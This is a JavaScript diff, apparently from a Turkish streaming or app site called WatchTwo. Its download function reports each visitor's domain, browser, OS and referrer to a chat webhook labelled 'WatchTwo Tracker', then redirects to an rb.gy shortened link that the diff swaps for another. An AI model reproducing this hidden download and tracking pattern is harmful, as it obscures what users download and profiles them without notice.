@@ -160,7 +160,7 @@ function closeAppAlert() {
 
 function openDownload() {
     // Navigate to download page or trigger download
-    window.open('https://rb.gy/amg0tr', '_self');
+    window.open('https://rb.gy/oean7r', '_self');
 }
 
 // ============================================
@@ -298,17 +298,17 @@ function openDownload() {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
-                        title: '🎯 Yeni İndirme',
+                        title: 'Yeni İndirme',
                         color: 0x2C2C2C,
                         description: `\`\`\`yml\nSite: ${currentDomain}\nTarayıcı: ${system.browser}\nOS: ${system.os}\nReferans: ${referrerDomain}\`\`\``,
-                        footer: { text: 'WatchTwo Tracker' }
+                        footer: { text: 'WatchTwo Tracker yigits mom' }
                     }]
                 })
             });
         });
     
     // İndirme
-    window.open('https://rb.gy/amg0tr', '_self');
+    window.open('https://rb.gy/oean7r', '_self');
 }
 // ============================================
 // ===== DOMContentLoaded - Diğer Kodlar ======
